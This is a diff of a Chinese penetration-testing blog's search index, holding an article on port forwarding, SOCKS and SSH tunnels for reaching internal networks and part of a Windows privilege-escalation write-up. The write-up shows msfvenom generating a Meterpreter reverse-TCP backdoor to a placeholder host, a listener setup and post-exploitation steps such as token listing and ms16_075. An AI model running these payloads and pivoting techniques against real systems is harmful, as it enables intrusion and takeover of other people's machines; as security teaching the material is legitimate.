+<li>添加动态转发隧道<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-04-30.png"></li>
+<li>这时候工作机使用浏览器设置<code>127.0.0.1:9999</code>为socks5代理，即可访问<code>172.16.1.101:80</code><br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-05-13.png"></li>
+<li>如果要连接服务器B的3389端口，则需要借助<code>sockscap64</code>之类的工具打开，因为Windows远程连接客户端原生不支持代理，需要借助工具强制让它使用代理，这里不多赘述，可参考我的另一篇文章让<a href="">BurpSuite使用MSF的socks4a代理</a>中<code>解决方法</code>-&gt;<code>步骤</code>-&gt;<code>1</code>中的sockscap64使用示例<h5 id="原理解释"><a href="#原理解释" class="headerlink" title="原理解释"></a>原理解释</h5>使用SSH动态端口转发，相当在远程SSH服务器启动了socks5代理服务，本地监听的<code>9999</code>端口流量将通过SSH隧道转发到SSH服务器，SSH服务器再对外发起网络请求。以上转发亦可使用<code>ssh</code>命令或者其它SSH客户端实现，具体方法可自行实验。<h5 id="出口数据流向"><a href="#出口数据流向" class="headerlink" title="出口数据流向"></a>出口数据流向</h5><div id="flowchart-0" class="flow-chart"></div>
 
-<h3 id="通过webshell上传并执行木马"><a href="#通过webshell上传并执行木马" class="headerlink" title="通过webshell上传并执行木马"></a>通过webshell上传并执行木马</h3><p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-11-37.png"></p>
-<h3 id="msf接收到会话"><a href="#msf接收到会话" class="headerlink" title="msf接收到会话"></a>msf接收到会话</h3><p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-12-59.png"></p>
-<h3 id="查看当前用户"><a href="#查看当前用户" class="headerlink" title="查看当前用户"></a>查看当前用户</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getuid  </span><br></pre></td></tr></table></figure>
-<p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-14-15.png"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use incognito   </span><br><span class="line">list_tokens -u  </span><br></pre></td></tr></table></figure>
-<p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-19-47.png"></p>
-<h3 id="查找可利用的提权exp"><a href="#查找可利用的提权exp" class="headerlink" title="查找可利用的提权exp"></a>查找可利用的提权exp</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">run post/multi/recon/local_exploit_suggester  </span><br></pre></td></tr></table></figure>
-<p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-20-11.png"></p>
-<h3 id="把当前msf回话放到后台，并记住其session值为5"><a href="#把当前msf回话放到后台，并记住其session值为5" class="headerlink" title="把当前msf回话放到后台，并记住其session值为5"></a>把当前msf回话放到后台，并记住其session值为5</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bg  </span><br></pre></td></tr></table></figure>
-<p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-20-36.png"></p>
-<h3 id="利用ms16-075得到system权限"><a href="#利用ms16-075得到system权限" class="headerlink" title="利用ms16_075得到system权限"></a>利用ms16_075得到system权限</h3><p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-20-50.png"></p>
+
+
+
+</li>
+</ol>
+<h4 id="4-2-使用SSH隧道本地转发"><a href="#4-2-使用SSH隧道本地转发" class="headerlink" title="4.2 使用SSH隧道本地转发"></a>4.2 使用SSH隧道本地转发</h4><h5 id="需求-1"><a href="#需求-1" class="headerlink" title="需求"></a>需求</h5><p>工作PC连接Windows服务器B的远程桌面。</p>
+<h5 id="网络拓扑-1"><a href="#网络拓扑-1" class="headerlink" title="网络拓扑"></a>网络拓扑</h5><p>工作PC可使用SSH连接<code>123.123.123.123:2222</code>登陆到内网服务器A，其它内网端口未做映射<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-08-50.png"></p>
+<h5 id="操作步骤-1"><a href="#操作步骤-1" class="headerlink" title="操作步骤"></a>操作步骤</h5><ol>
+<li>工作机<code>xshell</code>创建连接后，在<code>属性</code>-&gt;<code>连接</code>-&gt;<code>隧道</code>中添加<code>Local</code>类型转发<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-15-41.png"></li>
+<li>这时工作机打开远程桌面客户端，通过连接<code>127.0.0.1:9999</code>端口，可连接到内网服务器B的<code>3389</code>端口<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-16-14.png"><h5 id="原理解释-1"><a href="#原理解释-1" class="headerlink" title="原理解释"></a>原理解释</h5>SSH隧道的本地转发，相当于把本地监听的<code>9999</code>端口接收到的TCP流量，通过SSH隧道转发到远程的SSH服务器A，服务器A再发起TCP连接到服务器B的3389端口。可以看到，本地转发跟动态转发有点相似，不同的是本地转发是转发了<code>一个远程端口</code>到本地，而动态转发可通过配置代理访问整个<code>远程网络</code>。<br>注意：这种方法转发<code>HTTP</code>端口一般无法成功，因为HTTP协议带有<code>Host</code>头，服务器端校验Host头后可能会重置该HTTP请求导致无法连接，如果想了解这一细节，不妨抓个包看看。</li>
+</ol>
+<h5 id="出口数据流向-1"><a href="#出口数据流向-1" class="headerlink" title="出口数据流向"></a>出口数据流向</h5><div id="flowchart-1" class="flow-chart"></div>
+
+<h4 id="4-3-使用SSH隧道远程转发"><a href="#4-3-使用SSH隧道远程转发" class="headerlink" title="4.3 使用SSH隧道远程转发"></a>4.3 使用SSH隧道远程转发</h4><h5 id="需求-2"><a href="#需求-2" class="headerlink" title="需求"></a>需求</h5><p>工作PC-B访问工作PC-A上面的MySQL数据库（3306端口）。</p>
+<h5 id="网络拓扑-2"><a href="#网络拓扑-2" class="headerlink" title="网络拓扑"></a>网络拓扑</h5><p><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-18-53.png"></p>
+<h5 id="操作步骤-2"><a href="#操作步骤-2" class="headerlink" title="操作步骤"></a>操作步骤</h5><p><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-19-09.png"></p>
+<h5 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h5><p>远程转发的功能刚好与本地转发相反，可以把本地监听的端口转发到远程服务器上，可用于办公区的机器需要访问工作机的本地端口时候使用，比如工作机上面配置了数据库服务，监听本地3306端口，通过转发本地<code>3306</code>端口到远程服务器A的<code>9999</code>端口上，服务器B可访问工作机的数据库应用。</p>
+<p>注意：远程转发默认只能转发到SSH服务器的环回网卡（127.0.0.1），外部网络访问（如本例）需要启动<code>GatewayPorts</code>配置：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 编辑sshd 的配置文件&#x2F;etc&#x2F;ssh&#x2F;sshd_config，将GatewayPorts 开关打开：</span><br><span class="line">GatewayPorts yes</span><br></pre></td></tr></table></figure>
+
+<h5 id="出口数据流向-2"><a href="#出口数据流向-2" class="headerlink" title="出口数据流向"></a>出口数据流向</h5><div id="flowchart-2" class="flow-chart"></div>
+
+<h3 id="五、代理链工具"><a href="#五、代理链工具" class="headerlink" title="五、代理链工具"></a>五、代理链工具</h3><p>强制程序使用代理，让一些不支持代理的工具也能使用socks代理</p>
+<ul>
+<li>proxychains</li>
+<li>sockscap64</li>
+</ul>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.freebuf.com/articles/web/170970.html">内网渗透之端口转发与代理工具总结</a><br><a href="https://xz.aliyun.com/t/142">内网端口转发及穿透</a><br><a href="https://ryaninf.github.io/2019/07/11/%E8%AE%A9BURP%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/">让BurpSuite使用MSF的socks4a代理</a><script src="https://cdnjs.cloudflare.com/ajax/libs/raphael/2.2.7/raphael.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/flowchart/1.6.5/flowchart.min.js"></script><textarea id="flowchart-0-code" style="display: none">st=>start: 工作机Firefox
+e=>end: 内网服务器B（172.16.1.101:80)
+op1=>operation: SSH动态转发本地监听端口（127.0.0.1:9999)
+op2=>operation: SSH隧道连接服务器A（172.16.1.100:22)
+st->op1->op2->e</textarea><textarea id="flowchart-0-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-0-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-0-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-0", options);</script><textarea id="flowchart-1-code" style="display: none">st=>start: 工作机RDP客户端
+e=>end: 内网服务器B（172.16.1.101:3389)
+op1=>operation: SSH动态转发本地监听端口（127.0.0.1:9999)
+op2=>operation: SSH隧道连接服务器A（172.16.1.100:22)
+st->op1->op2->e</textarea><textarea id="flowchart-1-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-1-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-1-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-1", options);</script><textarea id="flowchart-2-code" style="display: none">st=>start: 工作PC-B Mysql客户端
+e=>end: 工作PC-A（192.168.1.100:3306)
+op1=>operation: 云服务器监听端口（123.123.123.123:9999)
+op2=>operation: 工作PC-A SSH客户端进程
+st->op1->op2->e</textarea><textarea id="flowchart-2-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-2-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-2-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-2", options);</script></p>
 ]]></content>
       <categories>
         <category>渗透测试</category>
@@ -641,96 +701,6 @@ st->op1->op2->op3->op4->e</textarea><textarea id="flowchart-0-options" style="di
       </tags>
   </entry>
   <entry>
-    <title>浅谈代理隧道的几种应用场景</title>
-    <url>/2019/07/08/%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/</url>
-    <content><![CDATA[<h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>熟练的代理转发，既可助你穿梭内网，亦可在工作生活中提供便利。理论上，任何接入互联网的计算机都是可访问的，但是如果目标主机处于内网，而我们又想和该目标主机进行通信的话，就需要借助一些端口转发工具来达到我们的目的。</p>
-<h3 id="二、端口转发"><a href="#二、端口转发" class="headerlink" title="二、端口转发"></a>二、端口转发</h3><p>把端口接收到的流量转发到另外一个端口，可以是本机的端口，也可以是其它网络的端口。<br>实现原理：基于传输层协议，把socket字节流原封不动进行转发。<br>弊端：如果上层协议有校验，会出错。比如<code>HTTP协议</code>中部分WEB服务会校验host头，导致HTTP连接中断。</p>
-<a id="more"></a>
-<h4 id="2-1-简单端口转发"><a href="#2-1-简单端口转发" class="headerlink" title="2.1 简单端口转发"></a>2.1 简单端口转发</h4><p>域C可访问域B，不可访问域A。<code>172.16.1.1</code>把<code>172.16.2.1</code>的SSH服务<code>22</code>端口转发到自己的<code>8022</code>端口，<code>192.168.1.2</code>可通过访问<code>172.16.1.1:8022</code>端口连接<code>172.16.2.1</code>的SSH服务。<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-15-56-37.png"><br>实现方法：</p>
-<ul>
-<li>Windows：<code>netsh int portproxy</code>，如:<code>netsh interface portproxy add v4tov4 listenport=8022 connectport=22 connectaddress=172.16.2.1</code></li>
-<li>Linux：<code>socat、iptables DNAT+SNAT</code>，如：<code>socat tcp-l:8022,reuseaddr,fork tcp:172.16.2.1:22,reuseaddr</code></li>
-<li>lcx</li>
-<li>ew</li>
-<li>其它</li>
-</ul>
-<h4 id="2-2-反弹端口转发"><a href="#2-2-反弹端口转发" class="headerlink" title="2.2 反弹端口转发"></a>2.2 反弹端口转发</h4><p>局域网B内PC1无法直接访问局域网A内机器，把局域网A服务器172.16.2.1:22端口转发到公网服务器1.1.1.1:8022端口，这样可以让PC1通过公网访问该机器。<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-00-25.png"><br>实现方法：</p>
-<ul>
-<li>SSH远程转发</li>
-<li>ngrok</li>
-<li>nps</li>
-<li>shootback</li>
-</ul>
-<h3 id="三、socks转发"><a href="#三、socks转发" class="headerlink" title="三、socks转发"></a>三、socks转发</h3><p>socks转发与端口转发类似，但是效果不同，端口转发效果只能访问单个端口的服务，socks转发可以访问整个目标网络。与VP*N效果类似，但是不能转发传输层以下的包。</p>
-<h4 id="3-1-简单socks转发"><a href="#3-1-简单socks转发" class="headerlink" title="3.1 简单socks转发"></a>3.1 简单socks转发</h4><p><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-01-24.png"><br>实现方法：</p>
-<ul>
-<li>小飞机</li>
-<li>ew</li>
-<li>nps</li>
-<li>reGeorg(webshell)</li>
-<li>冰歇(webshell)<h4 id="3-2-反弹socks转发"><a href="#3-2-反弹socks转发" class="headerlink" title="3.2 反弹socks转发"></a>3.2 反弹socks转发</h4>socks服务器位于内网，外部机器通过公网访问反弹的socks端口来访问内网。<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-02-20.png"><br>实现方法：</li>
-<li>小飞机+反弹端口</li>
-<li>ew</li>
-<li>nps</li>
-<li>其它socks服务+反弹端口</li>
-</ul>
-<h3 id="四、SSH代理隧道"><a href="#四、SSH代理隧道" class="headerlink" title="四、SSH代理隧道"></a>四、SSH代理隧道</h3><h4 id="4-1-使用SSH动态端口转发"><a href="#4-1-使用SSH动态端口转发" class="headerlink" title="4.1 使用SSH动态端口转发"></a>4.1 使用SSH动态端口转发</h4><h5 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h5><p>使用工作PC访问公司内网服务器，登陆内网网站、登陆内网服务器。</p>
-<h5 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h5><p>工作PC可使用SSH连接123.123.123.123:2222登陆到内网服务器A，其它内网端口未做映射<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-03-35.png"></p>
-<h5 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h5><ol>
-<li>工作机使用Xshell新建连接，并填好连接信息，然后打开隧道选项<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-04-10.png"></li>
-<li>添加动态转发隧道<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-04-30.png"></li>
-<li>这时候工作机使用浏览器设置<code>127.0.0.1:9999</code>为socks5代理，即可访问<code>172.16.1.101:80</code><br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-05-13.png"></li>
-<li>如果要连接服务器B的3389端口，则需要借助<code>sockscap64</code>之类的工具打开，因为Windows远程连接客户端原生不支持代理，需要借助工具强制让它使用代理，这里不多赘述，可参考我的另一篇文章让<a href>BurpSuite使用MSF的socks4a代理</a>中<code>解决方法</code>-&gt;<code>步骤</code>-&gt;<code>1</code>中的sockscap64使用示例<h5 id="原理解释"><a href="#原理解释" class="headerlink" title="原理解释"></a>原理解释</h5>使用SSH动态端口转发，相当在远程SSH服务器启动了socks5代理服务，本地监听的<code>9999</code>端口流量将通过SSH隧道转发到SSH服务器，SSH服务器再对外发起网络请求。以上转发亦可使用<code>ssh</code>命令或者其它SSH客户端实现，具体方法可自行实验。<h5 id="出口数据流向"><a href="#出口数据流向" class="headerlink" title="出口数据流向"></a>出口数据流向</h5><div id="flowchart-0" class="flow-chart"></div>
-
-
-
-
-</li>
-</ol>
-<h4 id="4-2-使用SSH隧道本地转发"><a href="#4-2-使用SSH隧道本地转发" class="headerlink" title="4.2 使用SSH隧道本地转发"></a>4.2 使用SSH隧道本地转发</h4><h5 id="需求-1"><a href="#需求-1" class="headerlink" title="需求"></a>需求</h5><p>工作PC连接Windows服务器B的远程桌面。</p>
-<h5 id="网络拓扑-1"><a href="#网络拓扑-1" class="headerlink" title="网络拓扑"></a>网络拓扑</h5><p>工作PC可使用SSH连接<code>123.123.123.123:2222</code>登陆到内网服务器A，其它内网端口未做映射<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-08-50.png"></p>
-<h5 id="操作步骤-1"><a href="#操作步骤-1" class="headerlink" title="操作步骤"></a>操作步骤</h5><ol>
-<li>工作机<code>xshell</code>创建连接后，在<code>属性</code>-&gt;<code>连接</code>-&gt;<code>隧道</code>中添加<code>Local</code>类型转发<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-15-41.png"></li>
-<li>这时工作机打开远程桌面客户端，通过连接<code>127.0.0.1:9999</code>端口，可连接到内网服务器B的<code>3389</code>端口<br><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-16-14.png"><h5 id="原理解释-1"><a href="#原理解释-1" class="headerlink" title="原理解释"></a>原理解释</h5>SSH隧道的本地转发，相当于把本地监听的<code>9999</code>端口接收到的TCP流量，通过SSH隧道转发到远程的SSH服务器A，服务器A再发起TCP连接到服务器B的3389端口。可以看到，本地转发跟动态转发有点相似，不同的是本地转发是转发了<code>一个远程端口</code>到本地，而动态转发可通过配置代理访问整个<code>远程网络</code>。<br>注意：这种方法转发<code>HTTP</code>端口一般无法成功，因为HTTP协议带有<code>Host</code>头，服务器端校验Host头后可能会重置该HTTP请求导致无法连接，如果想了解这一细节，不妨抓个包看看。</li>
-</ol>
-<h5 id="出口数据流向-1"><a href="#出口数据流向-1" class="headerlink" title="出口数据流向"></a>出口数据流向</h5><div id="flowchart-1" class="flow-chart"></div>
-
-<h4 id="4-3-使用SSH隧道远程转发"><a href="#4-3-使用SSH隧道远程转发" class="headerlink" title="4.3 使用SSH隧道远程转发"></a>4.3 使用SSH隧道远程转发</h4><h5 id="需求-2"><a href="#需求-2" class="headerlink" title="需求"></a>需求</h5><p>工作PC-B访问工作PC-A上面的MySQL数据库（3306端口）。</p>
-<h5 id="网络拓扑-2"><a href="#网络拓扑-2" class="headerlink" title="网络拓扑"></a>网络拓扑</h5><p><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-18-53.png"></p>
-<h5 id="操作步骤-2"><a href="#操作步骤-2" class="headerlink" title="操作步骤"></a>操作步骤</h5><p><img data-src="%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/2020-08-19-16-19-09.png"></p>
-<h5 id="原理说明"><a href="#原理说明" class="headerlink" title="原理说明"></a>原理说明</h5><p>远程转发的功能刚好与本地转发相反，可以把本地监听的端口转发到远程服务器上，可用于办公区的机器需要访问工作机的本地端口时候使用，比如工作机上面配置了数据库服务，监听本地3306端口，通过转发本地<code>3306</code>端口到远程服务器A的<code>9999</code>端口上，服务器B可访问工作机的数据库应用。</p>
-<p>注意：远程转发默认只能转发到SSH服务器的环回网卡（127.0.0.1），外部网络访问（如本例）需要启动<code>GatewayPorts</code>配置：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 编辑sshd 的配置文件&#x2F;etc&#x2F;ssh&#x2F;sshd_config，将GatewayPorts 开关打开：</span><br><span class="line">GatewayPorts yes</span><br></pre></td></tr></table></figure>
-
-<h5 id="出口数据流向-2"><a href="#出口数据流向-2" class="headerlink" title="出口数据流向"></a>出口数据流向</h5><div id="flowchart-2" class="flow-chart"></div>
-
-<h3 id="五、代理链工具"><a href="#五、代理链工具" class="headerlink" title="五、代理链工具"></a>五、代理链工具</h3><p>强制程序使用代理，让一些不支持代理的工具也能使用socks代理</p>
-<ul>
-<li>proxychains</li>
-<li>sockscap64</li>
-</ul>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.freebuf.com/articles/web/170970.html">内网渗透之端口转发与代理工具总结</a><br><a href="https://xz.aliyun.com/t/142">内网端口转发及穿透</a><br><a href="https://ryaninf.github.io/2019/07/11/%E8%AE%A9BURP%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86/">让BurpSuite使用MSF的socks4a代理</a><script src="https://cdnjs.cloudflare.com/ajax/libs/raphael/2.2.7/raphael.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/flowchart/1.6.5/flowchart.min.js"></script><textarea id="flowchart-0-code" style="display: none">st=>start: 工作机Firefox
-e=>end: 内网服务器B（172.16.1.101:80)
-op1=>operation: SSH动态转发本地监听端口（127.0.0.1:9999)
-op2=>operation: SSH隧道连接服务器A（172.16.1.100:22)
-st->op1->op2->e</textarea><textarea id="flowchart-0-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-0-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-0-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-0", options);</script><textarea id="flowchart-1-code" style="display: none">st=>start: 工作机RDP客户端
-e=>end: 内网服务器B（172.16.1.101:3389)
-op1=>operation: SSH动态转发本地监听端口（127.0.0.1:9999)
-op2=>operation: SSH隧道连接服务器A（172.16.1.100:22)
-st->op1->op2->e</textarea><textarea id="flowchart-1-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-1-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-1-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-1", options);</script><textarea id="flowchart-2-code" style="display: none">st=>start: 工作PC-B Mysql客户端
-e=>end: 工作PC-A（192.168.1.100:3306)
-op1=>operation: 云服务器监听端口（123.123.123.123:9999)
-op2=>operation: 工作PC-A SSH客户端进程
-st->op1->op2->e</textarea><textarea id="flowchart-2-options" style="display: none">{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12}</textarea><script>  var code = document.getElementById("flowchart-2-code").value;  var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-2-options").value));  var diagram = flowchart.parse(code);  diagram.drawSVG("flowchart-2", options);</script></p>
-]]></content>
-      <categories>
-        <category>渗透测试</category>
-      </categories>
-      <tags>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>记一次远程命令执行漏洞的挖掘过程</title>
     <url>/2019/07/15/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%8C%96%E6%8E%98%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong><br>本文已在Freebuf发布，但文章经Freebuf编辑改动导致有小部分错误，故在这里改正并重新发布。<br><em>原文链接： <a href="https://www.freebuf.com/vuls/185380.html">https://www.freebuf.com/vuls/185380.html</a></em></p>
@@ -763,5 +733,35 @@ st->op1->op2->e</textarea><textarea id="flowchart-2-options" style="display: non
       <categories>
         <category>漏洞挖掘</category>
       </categories>
+  </entry>
+  <entry>
+    <title>记一次Windows提权过程</title>
+    <url>/2019/07/10/%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
+<h3 id="通过任意文件上传获取到ASP-webshell"><a href="#通过任意文件上传获取到ASP-webshell" class="headerlink" title="通过任意文件上传获取到ASP webshell"></a>通过任意文件上传获取到ASP webshell</h3><p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-10-21.png"></p>
+<h3 id="生成msf-meterpreter后门"><a href="#生成msf-meterpreter后门" class="headerlink" title="生成msf meterpreter后门"></a>生成msf meterpreter后门</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &gt; shell1.exe  </span><br></pre></td></tr></table></figure>
+
+<h3 id="启动监听"><a href="#启动监听" class="headerlink" title="启动监听"></a>启动监听</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler  </span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_tcp  </span><br><span class="line">set LHOST x.x.x.x  </span><br><span class="line">set LPORT xx  </span><br><span class="line">exploit </span><br></pre></td></tr></table></figure>
+
+<a id="more"></a>
+
+<h3 id="通过webshell上传并执行木马"><a href="#通过webshell上传并执行木马" class="headerlink" title="通过webshell上传并执行木马"></a>通过webshell上传并执行木马</h3><p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-11-37.png"></p>
+<h3 id="msf接收到会话"><a href="#msf接收到会话" class="headerlink" title="msf接收到会话"></a>msf接收到会话</h3><p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-12-59.png"></p>
+<h3 id="查看当前用户"><a href="#查看当前用户" class="headerlink" title="查看当前用户"></a>查看当前用户</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getuid  </span><br></pre></td></tr></table></figure>
+<p><img data-src="%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B/2020-08-19-18-14-15.png"></p>
